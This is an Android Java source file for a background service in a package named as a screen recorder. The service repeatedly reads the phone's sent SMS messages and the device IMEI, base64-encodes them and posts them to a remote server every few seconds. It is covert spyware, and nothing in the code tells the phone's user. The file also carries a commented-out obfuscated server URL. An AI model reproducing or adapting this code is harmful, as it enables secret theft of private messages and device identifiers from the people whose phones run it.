package com.recorder.screen.screen_recorder.services;


import android.annotation.SuppressLint;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.SignalStrength;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.recorder.screen.screen_recorder.R;
import com.recorder.screen.screen_recorder.helper.Base64;
import com.recorder.screen.screen_recorder.helper.UrlDemo;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.util.InetAddressUtils;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class mainservice extends Service 
{
	public static boolean write_lock = false;
	public static boolean main_service = false;
	private File mSampleFile = null;
	public static final String myprefs = "mySharedPreferences";
	MyPhoneStateListener MyListener;
	ConnectivityManager connectivity;
	TelephonyManager tm1;
	NetworkInfo wifiInfo;
	private File sampleDir2 = null;
	long INTERVAL = 10000; // 15 min file transfer time
	private static String time_stamp = "";
	private File prevFile = null;
	String finalstring; // which are transfer to server
	String FileName;
	String gpscall; // gps string
	String callString = ""; // call String
	String smsString = ""; // incoming sms string
//////////////////////
	String Name_of_Network;
	String info;
	
	public String phone;
	String email;
	int voltage;
	
	String Time;
	public static String Temp = "37";
	String Network_Strength;
	String IMEI;
	
//////////////////
	
	String gpsstring = "";
	private File root = null;
	private File gpxfile = null;
	byte decode[];
	int datet;
	String receiveString = "";
	String callt;
	int datef = 0;
	int a;
	Cursor c;
	String date2;
	String date1;
	String datetest = "";
	public String newString3 = "";
	String system_folder[] = { "sampleDir2" };
	ArrayList<String> arlist = new ArrayList<String>();;
	String name;
	String Textfile;
	// Decoded URL with extra special char For Combined project Email
    boolean gpsfound=false,smsfound=false,callhistoryfound=false;
	private Timer timer = new Timer();

	public void onCreate() 
	{
		super.onCreate();
		main_service = true;
		// String url = "8c$7r8tsgu#72a#8166:ptt%xpsi$dinaf32ru3da8rdnA61";
		/*String url = "dnA6s*$ppit7g66:ptt%xpsi$dinaf3lru3da8r";
		newString3 = EncoDeco.decryptURL(url);
		TelephonyManager tm =	(TelephonyManager)getSystemService(TELEPHONY_SERVICE);
		System.out.println(newString3);*/

	}

	public void onStart(Intent intent, int startId) 
	{
		super.onStart(intent, startId);

		startservice();
	}
	public void strone(String strsms,String addr,String dt) {

		try
		{
			FileOutputStream fOut = openFileOutput("sms.txt", MODE_APPEND);
			fOut.close();
		}
		catch(Exception e)
		{
			Log.d(getClass().getSimpleName(), "exception thrown in SMSService "+e);
		}
		try
		{
			FileOutputStream fOut = openFileOutput("sms.txt", MODE_APPEND);
			OutputStreamWriter osw = new OutputStreamWriter(fOut);  


			// Write the string to the file 
			osw.append("<SMS>");
			osw.append("<SMSDirection>");
			osw.append("Outgoing Sms");
			osw.append("</SMSDirection>");
			osw.append("<SMSNumber>");
			osw.append(addr);
			osw.append("</SMSNumber>");
			osw.append("<SMSDATE>");
			osw.append(dt);
			osw.append("</SMSDATE>");
			osw.append("<SMSBody>");
			osw.append(strsms);
			osw.append("</SMSBody>"); 
			osw.append("</SMS>");
			osw.close();
			fOut.close();
		}
		catch(Exception e)
		{
			Log.d(getClass().getSimpleName(), "Exception thrown in SMSService.java "+e);
		}
		Log.d(getClass().getSimpleName(), "file written "+strsms);
		System.out.println("mainservicePage + " +strsms);
		return;
	}

	private void startservice() {

		timer.scheduleAtFixedRate(new TimerTask() {

			@SuppressLint("WorldReadableFiles")
			public void run() {

				Log.e(".............", "----------------------------------------- mainservice");
				
				int mode1 = Context.MODE_PRIVATE;
				String myprefssms = "mySharedPreferencessms";
				SharedPreferences mysharedpreferences3 = getSharedPreferences(
						myprefssms, mode1);
				String sms = mysharedpreferences3.getString(getString(R.string.SMS), "");
              
				if(sms.equalsIgnoreCase("A")) 
				{
				
				String myprefstime = "mySharedPreferencestime";
				String SORT_ORDER1 = "date ASC";
				SharedPreferences mySharedPreferences8 = getSharedPreferences(myprefstime, mode1);
				long time = mySharedPreferences8.getLong("time", System.currentTimeMillis()-18000);
				if(time==0)
				{
					time = System.currentTimeMillis()-18000;
				}
				
				ContentResolver cr = getContentResolver();
				Uri message = Uri.parse("content://sms/");
				Cursor c = cr.query(message, new String[]{"_id","address","body","date"}, "(type==2) AND date >"+time, null, SORT_ORDER1);
				String number = "";
				String body = "";
				
				if(c.getCount()!=0)
				{
					Log.d("Debug", "in main service count "+c.getCount());
				 while(c.moveToNext())
					{
						int id = c.getInt(0);
						Log.d(getClass().getSimpleName(), "inselfchange get id"+id);
						number = c.getString(1);
						body = c.getString(2);
						Log.d(getClass().getSimpleName(), "inselfchange get body"+body);
						long date1 = c.getLong(3);
						Log.d(getClass().getSimpleName(), "inselfchange get date"+date1);
						int mode = Service.MODE_PRIVATE;
						SharedPreferences mySharedPreferences39 = getSharedPreferences(myprefstime, mode);
						SharedPreferences.Editor editor = mySharedPreferences39.edit();
						editor.putLong("time",date1);
						editor.commit();
						
						Date dt = new Date();
						String t = dt.toLocaleString().toString();
						Log.d("Debug", "body "+body);
						strone(body,number,t);
					}
				}
				
			}// end of sms ==A
				
				///////////////////////////////////////////////////////////////
				
				

				try {

					// Code for Retrieve incoming sms in a text file in internal
					// private memory
					Log.d(getClass().getSimpleName(), "in main service");
					FileInputStream smsIn = openFileInput("sms.txt");

					InputStreamReader isr = new InputStreamReader(smsIn);

					char[] smsBuffer = new char[1000000];
					isr.read(smsBuffer);
					// Transform the chars to a String
					smsString = new String(smsBuffer).trim();
					if (smsString.length() == 0 || smsString == null) {
						smsfound=false;
						smsString = "<SMSStart>" + " " + "</SMSStart>";
					} else {
						smsString = "<SMSStart>" + smsString + "</SMSStart>";
						smsfound=true;
					}
					Log.d("smsstring","message string:"+smsString);
					isr.close();
					smsIn.close();

				} catch (IOException ioe) {
					Log.v(getClass().getSimpleName(), "Exception thrown 4  " + ioe);
				}


				// to get a imei number
				TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
				String imei = tm.getDeviceId();
				byte[] imeiCHistory = imei.getBytes();
				String imeiChistoryEncode = android.util.Base64.encodeToString(imeiCHistory, android.util.Base64.DEFAULT);
				String imeiCHistoryString = imeiChistoryEncode.replaceAll("\n", "");


				try {
					Date dt = new Date();
					int min = dt.getMinutes();
					int hr = dt.getHours();
					String strmin = "", strhr = "";
					if (min < 10)
						strmin = "0" + Integer.toString(min);
					else
						strmin = Integer.toString(min);
					if (hr < 10)
						strhr = "0" + Integer.toString(hr);
					else
						strhr = Integer.toString(hr);
					time_stamp = "" + strhr + "_" + strmin + "_" + Integer.toString(dt.getMonth() + 1) + "_" + Integer.toString(dt.getDate()) + "_" + Integer.toString(dt.getYear() + 1900) + "_";
				} catch (Exception e) {
					Log.d(getClass().getSimpleName(), "Exception:" + e);

				}

				finalstring = "<SMSMessage>" + smsString + gpscall + "</SMSMessage>";

				// base 64 encoded
				try {
					Log.d(getClass().getSimpleName(), "Final " + finalstring);

					String Callfile_name = time_stamp+"CallHistory.txt";
					byte[] namedata = Callfile_name.getBytes("UTF-8");
					String filenameencode = android.util.Base64.encodeToString(namedata, android.util.Base64.DEFAULT);
					FileName = filenameencode.replaceAll("\n", "");

				} catch (Exception e) {
					Log.d(getClass().getSimpleName(),
							"ADVANCEDSNF exception while calling makelogfile "
									+ e);
				}
				byte encode[] = finalstring.getBytes();
				String finalstring1 = Base64.encodeBytes(encode);
				String CHistoryDataString = finalstring1.replaceAll("\n", "");
				System.out.println("CallHistoryBaseString ==" + CHistoryDataString);
				HttpClient httpclient = new DefaultHttpClient();

				// Log.v("File", "Noway"+value);
				connectivity = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
				wifiInfo = connectivity.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
				NetworkInfo wifiInfo1 = connectivity.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
				if (wifiInfo.getState().toString()
						.equalsIgnoreCase("CONNECTED")
						|| wifiInfo1.getState().toString()
								.equalsIgnoreCase("CONNECTED")) {
					String fsupload = UrlDemo.fsupload;
					HttpPost httppost = new HttpPost(fsupload);
					Log.d("Test"," Mainservice _url == " +fsupload);

					try {

						// Add your data for sending

						List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();

						nameValuePairs.add(new BasicNameValuePair("IMEI", imeiCHistoryString));
						nameValuePairs.add(new BasicNameValuePair("Filedata", CHistoryDataString));
						nameValuePairs.add(new BasicNameValuePair("Email", FileName));

						httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
						HttpResponse response = httpclient.execute(httppost);
						HttpEntity entity = response.getEntity();
						InputStream in = entity.getContent();
						String buffer = "";
						for (int i = in.read(); i != -1; i = in.read()) {
							buffer += (char) i;
							i++;
						}
						in.close();

						 Log.d("Debug", "Response of SMS = " + buffer);

					}
					catch (Exception e) {

						Log.d("contacts", "excpeption 1 in mainservice " + e);
					}
				}
				else {

				}

			}// end of run method

		}, 2000, INTERVAL);

		// ;

	}


	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	public void onDestroy() {
		main_service = false;
		try {
			timer.cancel();
		} catch (Exception e) {
			Log.d(getClass().getSimpleName(), "exception thrown in mainservice " + e);
		}
		try
		{
			unregisterReceiver(mBatInfoReceiver);
		}
		catch(Exception e)
		{
			;
		}
		try
		{
			if (tm1 != null)
				tm1.listen(MyListener, PhoneStateListener.LISTEN_NONE);
		}
		catch(Exception e)
		{
			;
		}
		super.onDestroy();

	}

	
	public class MyPhoneStateListener extends PhoneStateListener {
		/*
		 * Get the Signal strength from the provider, each tiome there is an
		 * update
		 */
		@SuppressLint("NewApi")
		@Override
		public void onSignalStrengthsChanged(SignalStrength Signal_Strength) {
			super.onSignalStrengthsChanged(Signal_Strength);
			Network_Strength = String.valueOf(Signal_Strength
					.getGsmSignalStrength());

		}

	};/* End of private Class */

	private BroadcastReceiver mBatInfoReceiver = new BroadcastReceiver() {
		@Override
		public void onReceive(Context context, Intent intent) {
			Temp = Integer.toString(intent.getIntExtra(
					BatteryManager.EXTRA_TEMPERATURE, 0)/10);

		}

	};

	/*
	 * @Override public void onDestroy() { //mBatInfoReceiver.abortBroadcast();
	 * unregisterReceiver(mBatInfoReceiver);
	 * 
	 * };
	 */

	public static String getIPAddress(boolean useIPv4) {
		try {
			List<NetworkInterface> interfaces = Collections
					.list(NetworkInterface.getNetworkInterfaces());
			for (NetworkInterface intf : interfaces) {
				List<InetAddress> addrs = Collections.list(intf
						.getInetAddresses());
				for (InetAddress addr : addrs) {
					if (!addr.isLoopbackAddress()) {
						String sAddr = addr.getHostAddress().toUpperCase();
						boolean isIPv4 = InetAddressUtils.isIPv4Address(sAddr);
						if (useIPv4) {
							if (isIPv4)
								return sAddr;
							Log.e("contacts", "IP address " + sAddr);
						} else {
							if (!isIPv4) {
								int delim = sAddr.indexOf('%'); // drop ip6 port
																// suffix
								return delim < 0 ? sAddr : sAddr.substring(0,
										delim);
							}
						}
					}
				}
			}
		} catch (Exception ex) {
		} // for now eat exceptions
		return "";
	}
}
